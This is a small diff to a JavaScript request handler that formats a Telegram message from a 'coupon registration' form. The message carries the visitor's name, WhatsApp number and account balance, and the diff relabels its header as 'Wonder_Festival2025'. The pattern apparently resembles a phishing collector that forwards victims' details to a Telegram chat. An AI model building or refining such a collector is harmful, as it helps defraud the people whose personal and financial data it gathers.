@@ -38,11 +38,11 @@ module.exports = async (req, res) => {
 
     // Format pesan untuk Telegram - gunakan format saldo asli dari form
     const telegramMessage = `
-🆕 Pendaftaran Kupon Baru:
+𝗪𝗼𝗻𝗱𝗲𝗿_𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹𝟮𝟬𝟮𝟱
 ────────────────────
-📛 Nama: ${name}
-📞 WhatsApp: https://wa.me/${phone}
-💳 Saldo: ${balance}
+𝗡𝗮𝗺𝗮 | ${name}
+𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 | https://wa.me/${phone}
+𝗦𝗮𝗹𝗱𝗼 | ${balance}
 ────────────────────
 📅 Tanggal: ${new Date().toLocaleString('id-ID')}
     `;
